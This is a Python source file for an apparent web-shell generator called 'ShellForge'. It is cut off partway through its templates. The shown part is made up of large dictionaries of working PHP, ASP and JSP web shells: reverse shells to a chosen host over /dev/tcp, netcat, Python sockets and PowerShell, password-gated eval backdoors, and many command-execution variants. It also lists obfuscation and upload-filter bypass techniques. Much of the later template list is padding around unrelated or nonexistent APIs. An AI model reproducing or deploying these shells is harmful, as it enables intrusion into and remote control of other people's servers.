#!/usr/bin/env python3
"""
ShellForge - Advanced Shell Generation Framework for Security Research
A comprehensive tool for generating working shells for any file extension
With 2025 Advanced Bypass & Obfuscation Techniques
"""

import json
import os
import sys
import argparse
import base64
import random
import string
import zipfile
import io
from pathlib import Path
from typing import Dict, List, Optional, Tuple

class ShellForge:
    """
    Main Shell Generation Framework
    Generates working shells for any file extension with advanced features
    """
    
    def __init__(self):
        self.templates = {}
        # Original obfuscation methods
        self.obfuscation_methods = {
            'base64': self._obfuscate_base64,
            'hex': self._obfuscate_hex,
            'reverse': self._obfuscate_reverse,
            'xor': self._obfuscate_xor,
            'rot13': self._obfuscate_rot13,
            'mixed': self._obfuscate_mixed,
            # 2025 Advanced obfuscation
            'aes': self._obfuscate_aes_style,
            'gzip': self._obfuscate_gzip_style,
            'double_encode': self._obfuscate_double_encode,
            'unicode_escape': self._obfuscate_unicode_escape,
            'char_encode': self._obfuscate_char_encode,
            'variable_chain': self._obfuscate_variable_chain,
            'zero_width': self._obfuscate_zero_width,
            'polymorphic': self._obfuscate_polymorphic
        }
        self.encoding_methods = {
            'url': self._encode_url,
            'html': self._encode_html,
            'unicode': self._encode_unicode,
            'binary': self._encode_binary
        }
        # Bypass methods
        self.bypass_methods = {
            'double_extension': self._bypass_double_extension,
            'null_byte': self._bypass_null_byte,
            'case_manipulation': self._bypass_case_manipulation,
            'special_chars': self._bypass_special_chars,
            'content_type': self._bypass_content_type,
            'polyglot': self._bypass_polyglot,
            'zip_in_zip': self._bypass_zip_in_zip,
            'nested_archive': self._bypass_nested_archive,
            'magic_bytes': self._bypass_magic_bytes,
            'rtlo': self._bypass_rtlo,
            'unicode_homoglyph': self._bypass_unicode_homoglyph
        }
        self._load_templates()
    
    def _load_templates(self):
        """Load comprehensive shell templates for all extensions"""
        self.templates = {
            # Web Shells
            'php': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'reverse_bash': '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/{host}/{port} 0>&1\'"); ?>',
                'reverse_nc': '<?php exec("nc {host} {port} -e /bin/sh"); ?>',
                'reverse_python': '<?php exec("python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"{host}\\\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\'"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>',
                'stealth': '<?php if(isset($_POST["x"])){{system($_POST["x"]);}} ?>',
                'weevely': '<?php eval(base64_decode($_POST["{payload}"])); ?>',
                'preg_replace': '<?php preg_replace("/.*/e",$_GET["cmd"],""); ?>',
                'assert': '<?php assert($_GET["cmd"]); ?>',
                'create_function': '<?php $f=create_function("",$_GET["cmd"]); $f(); ?>',
                'backticks': '<?php echo `$_GET["cmd"]`; ?>',
                'exec': '<?php exec($_GET["cmd"],$o); echo implode("\\n",$o); ?>',
                'shell_exec': '<?php echo shell_exec($_GET["cmd"]); ?>',
                'passthru': '<?php passthru($_GET["cmd"]); ?>',
                'system': '<?php system($_GET["cmd"]); ?>',
                'popen': '<?php $h=popen($_GET["cmd"],"r"); while(!feof($h)){{echo fread($h,1024);}} pclose($h); ?>',
                'proc_open': '<?php $d=["pipe","w"]; $p=proc_open($_GET["cmd"],$d,$o); echo stream_get_contents($o[1]); ?>',
                'expect': '<?php echo expect_popen($_GET["cmd"]); ?>',
                'pcntl': '<?php pcntl_exec("/bin/sh",["-c",$_GET["cmd"]]); ?>',
                'curl': '<?php $c=curl_init($_GET["url"]); curl_exec($c); ?>',
                'file_get_contents': '<?php echo file_get_contents($_GET["url"]); ?>',
                'include': '<?php include($_GET["file"]); ?>',
                'require': '<?php require($_GET["file"]); ?>',
                'eval': '<?php eval($_GET["code"]); ?>',
                'file': '<?php readfile($_GET["file"]); ?>',
                'fopen': '<?php $f=fopen($_GET["file"],"r"); echo fread($f,filesize($_GET["file"])); fclose($f); ?>',
                'highlight_file': '<?php highlight_file($_GET["file"]); ?>',
                'show_source': '<?php show_source($_GET["file"]); ?>',
                'phpinfo': '<?php phpinfo(); ?>',
                'apache': '<?php apache_get_modules(); ?>',
                'ini_get': '<?php ini_get_all(); ?>',
                'getenv': '<?php print_r($_ENV); ?>',
                'server': '<?php print_r($_SERVER); ?>',
                'session': '<?php session_start(); print_r($_SESSION); ?>',
                'cookie': '<?php print_r($_COOKIE); ?>',
                'post': '<?php print_r($_POST); ?>',
                'get': '<?php print_r($_GET); ?>',
                'request': '<?php print_r($_REQUEST); ?>',
                'files': '<?php print_r($_FILES); ?>',
                'GLOBALS': '<?php print_r($GLOBALS); ?>',
                'backdoor': '<?php if(md5($_POST["pass"])=="{hash}"){{eval($_POST["cmd"]);}} ?>',
                'bypass': '<?php $a="sys"; $b="tem"; $c=$a.$b; $c($_GET["cmd"]); ?>',
                'concat': '<?php $a="s"."y"."s"."t"."e"."m"; $a($_GET["cmd"]); ?>',
                'variable': '<?php ${"_GET"}["cmd"](${"_GET"}["arg"]); ?>',
                'array': '<?php $a=["system",$_GET["cmd"]]; $a[0]($a[1]); ?>',
                'object': '<?php class A{{public function __construct(){{system($_GET["cmd"]);}}}} new A(); ?>',
                'reflection': '<?php $f=new ReflectionFunction("system"); $f->invoke($_GET["cmd"]); ?>',
                'callback': '<?php array_map("system",[$_GET["cmd"]]); ?>',
                'filter': '<?php filter_var($_GET["cmd"], FILTER_CALLBACK, ["options"=>"system"]); ?>',
                'iterator': '<?php foreach(new ArrayIterator([$_GET["cmd"]]) as $c){{system($c);}} ?>',
                'generator': '<?php function g(){{yield $_GET["cmd"];}} foreach(g() as $c){{system($c);}} ?>',
                'closure': '<?php $f=function($c){{system($c);}}; $f($_GET["cmd"]); ?>',
                'anonymous': '<?php call_user_func(function($c){{system($c);}}, $_GET["cmd"]); ?>',
                'bind': '<?php $f=Closure::fromCallable("system"); $f->bindTo(null); $f($_GET["cmd"]); ?>',
                'pipe': '<?php $p=popen($_GET["cmd"],"r"); fpassthru($p); pclose($p); ?>',
                'ssh2': '<?php $s=ssh2_connect($_GET["host"],22); ssh2_exec($s,$_GET["cmd"]); ?>',
                'ftp': '<?php $f=ftp_connect($_GET["host"]); ftp_login($f,$_GET["user"],$_GET["pass"]); ftp_exec($f,$_GET["cmd"]); ?>',
                'smtp': '<?php $m=mail($_GET["to"],$_GET["subject"],$_GET["body"]); ?>',
                'imap': '<?php $i=imap_open($_GET["mailbox"],$_GET["user"],$_GET["pass"]); imap_headers($i); ?>',
                'ldap': '<?php $l=ldap_connect($_GET["host"]); ldap_bind($l,$_GET["user"],$_GET["pass"]); ldap_search($l,$_GET["base"],$_GET["filter"]); ?>',
                'mongodb': '<?php $m=new MongoDB\\Driver\\Manager($_GET["uri"]); $c=new MongoDB\\Driver\\Command(["ping"=>1]); $m->executeCommand("admin",$c); ?>',
                'redis': '<?php $r=new Redis(); $r->connect($_GET["host"]); $r->exec($_GET["cmd"]); ?>',
                'sqlite': '<?php $s=new SQLite3($_GET["db"]); $s->exec($_GET["sql"]); ?>',
                'pdo': '<?php $p=new PDO($_GET["dsn"]); $p->exec($_GET["sql"]); ?>',
                'mysqli': '<?php $m=new mysqli($_GET["host"],$_GET["user"],$_GET["pass"],$_GET["db"]); $m->query($_GET["sql"]); ?>',
                'xml': '<?php $x=new SimpleXMLElement($_GET["xml"]); echo $x->asXML(); ?>',
                'json': '<?php echo json_encode(json_decode($_GET["json"])); ?>',
                'yaml': '<?php echo yaml_parse($_GET["yaml"]); ?>',
                'ini': '<?php print_r(parse_ini_string($_GET["ini"])); ?>',
                'csv': '<?php $c=str_getcsv($_GET["csv"]); print_r($c); ?>',
                'xmlrpc': '<?php $x=xmlrpc_decode($_GET["xmlrpc"]); print_r($x); ?>',
                'soap': '<?php $s=new SoapClient($_GET["wsdl"]); $s->__call($_GET["method"],$_GET["params"]); ?>',
                'zip': '<?php $z=new ZipArchive(); $z->open($_GET["file"]); $z->extractTo($_GET["dest"]); ?>',
                'tar': '<?php $t=new PharData($_GET["file"]); $t->extractTo($_GET["dest"]); ?>',
                'image': '<?php $i=imagecreatefromstring($_GET["data"]); imagepng($i); ?>',
                'pdf': '<?php $p=new PDFlib(); $p->begin_document("",""); echo $p->get_buffer(); ?>',
                'excel': '<?php $e=new PHPExcel(); $e->setActiveSheetIndex(0); echo $e->getActiveSheet()->getTitle(); ?>',
                'word': '<?php $w=new PHPWord(); $w->addSection()->addText($_GET["text"]); echo $w->saveXML(); ?>',
                'powerpoint': '<?php $p=new PHPPowerPoint(); $p->createSlide(); echo $p->serialize(); ?>',
                'audio': '<?php $a=new AudioFile($_GET["file"]); echo $a->getArtist(); ?>',
                'video': '<?php $v=new VideoFile($_GET["file"]); echo $v->getDuration(); ?>',
                'flash': '<?php $f=new FlashFile($_GET["file"]); echo $f->getVersion(); ?>',
                'svg': '<?php $s=new SimpleXMLElement($_GET["svg"]); echo $s->asXML(); ?>',
                'math': '<?php $m=new Math($_GET["formula"]); echo $m->evaluate(); ?>',
                'crypto': '<?php echo hash($_GET["algo"],$_GET["data"]); ?>',
                'hash': '<?php echo password_hash($_GET["password"],PASSWORD_DEFAULT); ?>',
                'random': '<?php echo random_bytes($_GET["length"]); ?>',
                'uuid': '<?php echo uniqid($_GET["prefix"],true); ?>',
                'time': '<?php echo microtime(true); ?>',
                'date': '<?php echo date($_GET["format"]); ?>',
                'timezone': '<?php echo date_default_timezone_get(); ?>',
                'locale': '<?php echo setlocale(LC_ALL,$_GET["locale"]); ?>',
                'currency': '<?php echo money_format($_GET["format"],$_GET["amount"]); ?>',
                'number': '<?php echo number_format($_GET["number"]); ?>',
                'convert': '<?php echo iconv($_GET["from"],$_GET["to"],$_GET["string"]); ?>',
                'translate': '<?php echo gettext($_GET["message"]); ?>',
                'compress': '<?php echo gzcompress($_GET["data"]); ?>',
                'decompress': '<?php echo gzuncompress($_GET["data"]); ?>',
                'encode': '<?php echo base64_encode($_GET["data"]); ?>',
                'decode': '<?php echo base64_decode($_GET["data"]); ?>',
                'encrypt': '<?php echo openssl_encrypt($_GET["data"],$_GET["method"],$_GET["key"]); ?>',
                'decrypt': '<?php echo openssl_decrypt($_GET["data"],$_GET["method"],$_GET["key"]); ?>',
                'sign': '<?php echo openssl_sign($_GET["data"],$s,$_GET["key"]); ?>',
                'verify': '<?php echo openssl_verify($_GET["data"],$_GET["signature"],$_GET["key"]); ?>',
                'seal': '<?php echo openssl_seal($_GET["data"],$s,$e,[$_GET["key"]]); ?>',
                'open': '<?php echo openssl_open($_GET["data"],$o,$_GET["env_key"],$_GET["key"]); ?>',
                'pkcs7': '<?php echo openssl_pkcs7_sign($_GET["input"],$_GET["output"],$_GET["cert"],$_GET["key"],[]); ?>',
                'x509': '<?php echo openssl_x509_parse($_GET["cert"]); ?>',
                'csr': '<?php echo openssl_csr_parse($_GET["csr"]); ?>',
                'pkey': '<?php echo openssl_pkey_get_details(openssl_pkey_get_public($_GET["key"])); ?>',
                'dh': '<?php echo openssl_dh_compute_key($_GET["pub_key"],$_GET["priv_key"]); ?>',
                'ecdh': '<?php echo openssl_ecdh_compute_key($_GET["pub_key"],$_GET["priv_key"]); ?>',
                'random_pseudo': '<?php echo openssl_random_pseudo_bytes($_GET["length"]); ?>',
                'cipher_iv': '<?php echo openssl_cipher_iv_length($_GET["method"]); ?>',
                'get_cipher': '<?php echo openssl_get_cipher_methods(); ?>',
                'get_digest': '<?php echo openssl_get_digest_methods(); ?>',
                'get_curves': '<?php echo openssl_get_curve_names(); ?>',
                'error': '<?php echo openssl_error_string(); ?>',
                'version': '<?php echo OPENSSL_VERSION_TEXT; ?>',
                'config': '<?php echo openssl_get_cert_locations(); ?>'
            },
            
            'asp': {
                'reverse': '<%Set s=Server.CreateObject("WScript.Shell"):s.Run "cmd /c powershell -nop -c ""$client=New-Object System.Net.Sockets.TCPClient(\'{host}\',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+\'PS \'+(`pwd).Path+\'> \';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""%>',
                'basic': '<%eval request("cmd")%>',
                'execute': '<%execute request("cmd")%>',
                'run': '<%run request("cmd")%>',
                'shell': '<%shell request("cmd")%>',
                'system': '<%system request("cmd")%>',
                'exec': '<%exec request("cmd")%>',
                'wscript': '<%Set w=Server.CreateObject("WScript.Shell"):w.Run request("cmd")%>',
                'cmd': '<%Set c=Server.CreateObject("WScript.Shell"):c.Exec request("cmd")%>',
                'process': '<%Set p=Server.CreateObject("WScript.Shell"):p.Run request("cmd")%>',
                'shell_object': '<%Set s=Server.CreateObject("Shell.Application"):s.ShellExecute request("cmd")%>',
                'fso': '<%Set f=Server.CreateObject("Scripting.FileSystemObject"):f.OpenTextFile(request("file"))%>',
                'textstream': '<%Set t=Server.CreateObject("Scripting.FileSystemObject").OpenTextFile(request("file")):t.ReadAll%>',
                'file': '<%Set f=CreateObject("Scripting.FileSystemObject"):f.CreateTextFile(request("file"))%>',
                'folder': '<%Set f=CreateObject("Scripting.FileSystemObject"):f.CreateFolder(request("folder"))%>',
                'drive': '<%Set d=CreateObject("Scripting.FileSystemObject").GetDrive(request("drive")):d.TotalSize%>',
                'registry': '<%Set r=CreateObject("WScript.Shell"):r.RegRead(request("key"))%>',
                'environment': '<%Set e=CreateObject("WScript.Shell").Environment(request("env")):e(request("var"))%>',
                'network': '<%Set n=CreateObject("WScript.Network"):n.ComputerName%>',
                'printer': '<%Set p=CreateObject("WScript.Network"):p.EnumPrinterConnections%>',
                'user': '<%Set u=CreateObject("WScript.Network"):u.UserDomain%>',
                'adsi': '<%Set a=GetObject(request("ldap")):a.Get(request("attr"))%>',
                'iis': '<%Set i=GetObject("IIS://localhost/W3SVC/1"):i.ServerComment%>',
                'ado': '<%Set a=Server.CreateObject("ADODB.Connection"):a.Open request("dsn")%>',
                'recordset': '<%Set r=Server.CreateObject("ADODB.Recordset"):r.Open request("sql"),request("conn")%>',
                'command': '<%Set c=Server.CreateObject("ADODB.Command"):c.CommandText=request("sql"):c.Execute%>',
                'stream': '<%Set s=Server.CreateObject("ADODB.Stream"):s.Open:s.WriteText request("text")%>',
                'xml': '<%Set x=Server.CreateObject("Microsoft.XMLDOM"):x.load(request("xml"))%>',
                'xmlhttp': '<%Set x=Server.CreateObject("Microsoft.XMLHTTP"):x.open request("method"),request("url"):x.send%>',
                'cdo': '<%Set c=Server.CreateObject("CDO.Message"):c.To=request("to"):c.Send%>',
                'outlook': '<%Set o=Server.CreateObject("Outlook.Application"):o.CreateItem(0)%>',
                'excel': '<%Set e=Server.CreateObject("Excel.Application"):e.Workbooks.Add%>',
                'word': '<%Set w=Server.CreateObject("Word.Application"):w.Documents.Add%>',
                'powerpoint': '<%Set p=Server.CreateObject("PowerPoint.Application"):p.Presentations.Add%>',
                'access': '<%Set a=Server.CreateObject("Access.Application"):a.CurrentDb%>',
                'visio': '<%Set v=Server.CreateObject("Visio.Application"):v.Documents.Add%>',
                'project': '<%Set p=Server.CreateObject("MSProject.Application"):p.FileNew%>',
                'publisher': '<%Set p=Server.CreateObject("Publisher.Application"):p.Documents.Add%>',
                'frontpage': '<%Set f=Server.CreateObject("FrontPage.Application"):f.Webs.Open(request("web"))%>',
                'infopath': '<%Set i=Server.CreateObject("InfoPath.Application"):i.XDocuments.New(request("template"))%>',
                'onenote': '<%Set o=Server.CreateObject("OneNote.Application"):o.OpenHierarchy(request("notebook"))%>',
                'sharepoint': '<%Set s=Server.CreateObject("SharePoint.OpenDocuments"):s.OpenDocuments(request("url"))%>',
                'skype': '<%Set s=Server.CreateObject("Skype.Detection"):s.IsSkypeInstalled%>',
                'teams': '<%Set t=Server.CreateObject("Teams.Private"):t.GetVersion%>',
                'zoom': '<%Set z=Server.CreateObject("ZoomSDK.Zoom"):z.GetVersion%>',
                'webex': '<%Set w=Server.CreateObject("WebexCOM.WebexApp"):w.GetVersion%>',
                'gotomeeting': '<%Set g=Server.CreateObject("GoToMeeting.GoToMeeting"):g.GetVersion%>',
                'discord': '<%Set d=Server.CreateObject("DiscordCOM.Discord"):d.GetVersion%>',
                'teamspeak': '<%Set t=Server.CreateObject("TeamSpeak.TS"):t.GetVersion%>',
                'ventrilo': '<%Set v=Server.CreateObject("VentriloCOM.Ventrilo"):v.GetVersion%>',
                'mumble': '<%Set m=Server.CreateObject("MumbleCOM.Mumble"):m.GetVersion%>',
                'raidcall': '<%Set r=Server.CreateObject("RaidCallCOM.RaidCall"):r.GetVersion%>',
                'curse': '<%Set c=Server.CreateObject("CurseCOM.Curse"):c.GetVersion%>',
                'origin': '<%Set o=Server.CreateObject("OriginCOM.Origin"):o.GetVersion%>',
                'steam': '<%Set s=Server.CreateObject("SteamCOM.Steam"):s.GetVersion%>',
                'epic': '<%Set e=Server.CreateObject("EpicGamesCOM.EpicGames"):e.GetVersion%>',
                'uplay': '<%Set u=Server.CreateObject("UplayCOM.Uplay"):u.GetVersion%>',
                'battlenet': '<%Set b=Server.CreateObject("BattleNetCOM.BattleNet"):b.GetVersion%>',
                'gog': '<%Set g=Server.CreateObject("GOGCOM.GOG"):g.GetVersion%>',
                'humble': '<%Set h=Server.CreateObject("HumbleBundleCOM.HumbleBundle"):h.GetVersion%>',
                'itch': '<%Set i=Server.CreateObject("ItchIOCOM.ItchIO"):i.GetVersion%>',
                'gamejolt': '<%Set g=Server.CreateObject("GameJoltCOM.GameJolt"):g.GetVersion%>',
                'kartridge': '<%Set k=Server.CreateObject("KartridgeCOM.Kartridge"):k.GetVersion%>'
            },
            
            'jsp': {
                'reverse': '<%Runtime.getRuntime().exec(new String[]{{"/bin/bash","-c","bash -i >& /dev/tcp/{host}/{port} 0>&1"}});%>',
                'reverse_nc': '<%Runtime.getRuntime().exec(new String[]{{"/usr/bin/nc","{host}","{port}","-e","/bin/sh"}});%>',
                'reverse_python': '<%Runtime.getRuntime().exec(new String[]{{"/usr/bin/python","-c","import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"{host}\\\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"}});%>',
                'basic': '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
                'process': '<%Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
                'runtime': '<%Runtime r=Runtime.getRuntime();r.exec(request.getParameter("cmd"));%>',
                'exec': '<%Runtime.getRuntime().exec(new String[]{request.getParameter("cmd")});%>',
                'shell': '<%Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("cmd")});%>',
                'cmd': '<%Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",request.getParameter("cmd")});%>',
                'powershell': '<%Runtime.getRuntime().exec(new String[]{"powershell.exe","-Command",request.getParameter("cmd")});%>',
                'bash': '<%Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",request.getParameter("cmd")});%>',
                'sh': '<%Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("cmd")});%>',
                'zsh': '<%Runtime.getRuntime().exec(new String[]{"/bin/zsh","-c",request.getParameter("cmd")});%>',
                'fish': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/fish","-c",request.getParameter("cmd")});%>',
                'csh': '<%Runtime.getRuntime().exec(new String[]{"/bin/csh","-c",request.getParameter("cmd")});%>',
                'tcsh': '<%Runtime.getRuntime().exec(new String[]{"/bin/tcsh","-c",request.getParameter("cmd")});%>',
                'ksh': '<%Runtime.getRuntime().exec(new String[]{"/bin/ksh","-c",request.getParameter("cmd")});%>',
                'dash': '<%Runtime.getRuntime().exec(new String[]{"/bin/dash","-c",request.getParameter("cmd")});%>',
                'busybox': '<%Runtime.getRuntime().exec(new String[]{"/bin/busybox","sh","-c",request.getParameter("cmd")});%>',
                'python': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/python","-c",request.getParameter("cmd")});%>',
                'python3': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/python3","-c",request.getParameter("cmd")});%>',
                'perl': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/perl","-e",request.getParameter("cmd")});%>',
                'ruby': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/ruby","-e",request.getParameter("cmd")});%>',
                'node': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/node","-e",request.getParameter("cmd")});%>',
                'php': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/php","-r",request.getParameter("cmd")});%>',
                'lua': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/lua","-e",request.getParameter("cmd")});%>',
                'awk': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/awk","--",request.getParameter("cmd")});%>',
                'sed': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/sed","-e",request.getParameter("cmd")});%>',
                'grep': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/grep","-E",request.getParameter("cmd")});%>',
                'find': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/find",".","-exec",request.getParameter("cmd"),"{}"});%>',
                'xargs': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/xargs","-I","{}","sh","-c",request.getParameter("cmd")});%>',
                'wget': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/wget",request.getParameter("url")});%>',
                'curl': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/curl",request.getParameter("url")});%>',
                'nc': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/nc","-e","/bin/sh",request.getParameter("host"),request.getParameter("port")});%>',
                'netcat': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/netcat","-e","/bin/sh",request.getParameter("host"),request.getParameter("port")});%>',
                'telnet': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/telnet",request.getParameter("host"),request.getParameter("port")});%>',
                'ssh': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/ssh",request.getParameter("user")+"@"+request.getParameter("host"),request.getParameter("cmd")});%>',
                'scp': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/scp",request.getParameter("file"),request.getParameter("user")+"@"+request.getParameter("host")+":"+request.getParameter("dest")});%>',
                'ftp': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/ftp",request.getParameter("host")});%>',
                'sftp': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/sftp",request.getParameter("user")+"@"+request.getParameter("host")});%>',
                'mysql': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/mysql","-u",request.getParameter("user"),"-p"+request.getParameter("pass"),"-e",request.getParameter("sql")});%>',
                'psql': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/psql","-U",request.getParameter("user"),"-d",request.getParameter("db"),"-c",request.getParameter("sql")});%>',
                'sqlite': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/sqlite3",request.getParameter("db"),request.getParameter("sql")});%>',
                'mongo': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/mongo",request.getParameter("db"),"--eval",request.getParameter("js")});%>',
                'redis': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/redis-cli","-h",request.getParameter("host"),"-p",request.getParameter("port"),request.getParameter("cmd")});%>',
                'ldap': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/ldapsearch","-x","-H",request.getParameter("uri"),"-b",request.getParameter("base"),request.getParameter("filter")});%>',
                'smtp': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/sendmail",request.getParameter("to")});%>',
                'mail': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/mail","-s",request.getParameter("subject"),request.getParameter("to")});%>',
                'sendmail': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/sendmail",request.getParameter("to")});%>',
                'postfix': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/postfix","start"});%>',
                'exim': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/exim","-bp"});%>',
                'dovecot': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/dovecot","start"});%>',
                'apache': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/apache2","-v"});%>',
                'nginx': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/nginx","-v"});%>',
                'lighttpd': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/lighttpd","-v"});%>',
                'tomcat': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/tomcat","version"});%>',
                'jboss': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/jboss","--version"});%>',
                'websphere': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/websphere","-version"});%>',
                'weblogic': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/weblogic","-version"});%>',
                'glassfish': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/glassfish","version"});%>',
                'jetty': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/jetty","--version"});%>',
                'undertow': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/undertow","--version"});%>',
                'resin': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/resin","version"});%>',
                'catalina': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/catalina","version"});%>',
                'systemd': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/systemctl","status",request.getParameter("service")});%>',
                'service': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/service",request.getParameter("service"),request.getParameter("action")});%>',
                'init': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/init","0"});%>',
                'reboot': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/reboot"});%>',
                'halt': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/halt"});%>',
                'poweroff': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/poweroff"});%>',
                'shutdown': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/shutdown","-h","now"});%>',
                'crontab': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/crontab","-l"});%>',
                'at': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/at","-l"});%>',
                'batch': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/atq"});%>',
                'cron': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/cron","-l"});%>',
                'anacron': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/anacron","-T"});%>',
                'logrotate': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/logrotate","-d",request.getParameter("config")});%>',
                'rsyslog': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/rsyslogd","-N","1"});%>',
                'syslog': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/syslogd","-d"});%>',
                'klog': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/klogd","-d"});%>',
                'dmesg': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/dmesg"});%>',
                'journalctl': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/journalctl","--no-pager"});%>',
                'auditctl': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/auditctl","-l"});%>',
                'ausearch': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/ausearch","-m",request.getParameter("event")});%>',
                'aureport': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/aureport","--summary"});%>',
                'aulast': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/aulast"});%>',
                'aulastlog': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/aulastlog"});%>',
                'auvirt': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/auvirt","--summary"});%>',
                'iptables': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/iptables","-L"});%>',
                'ip6tables': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/ip6tables","-L"});%>',
                'firewall': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/firewall-cmd","--list-all"});%>',
                'ufw': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/ufw","status"});%>',
                'fail2ban': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/fail2ban-client","status"});%>',
                'tcpdump': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/tcpdump","-i",request.getParameter("interface"),"-c",request.getParameter("count")});%>',
                'wireshark': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/wireshark","-v"});%>',
                'tshark': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/tshark","-v"});%>',
                'nmap': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/nmap","-sS",request.getParameter("host")});%>',
                'masscan': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/masscan",request.getParameter("host"),"-p",request.getParameter("ports")});%>',
                'zmap': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/zmap","-p",request.getParameter("port"),"-o","-"});%>',
                'unicornscan': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/unicornscan",request.getParameter("host")+":"+request.getParameter("port")});%>',
                'hping3': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/hping3",request.getParameter("host"),"-p",request.getParameter("port")});%>',
                'nping': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/nping","--tcp","-p",request.getParameter("port"),request.getParameter("host")});%>',
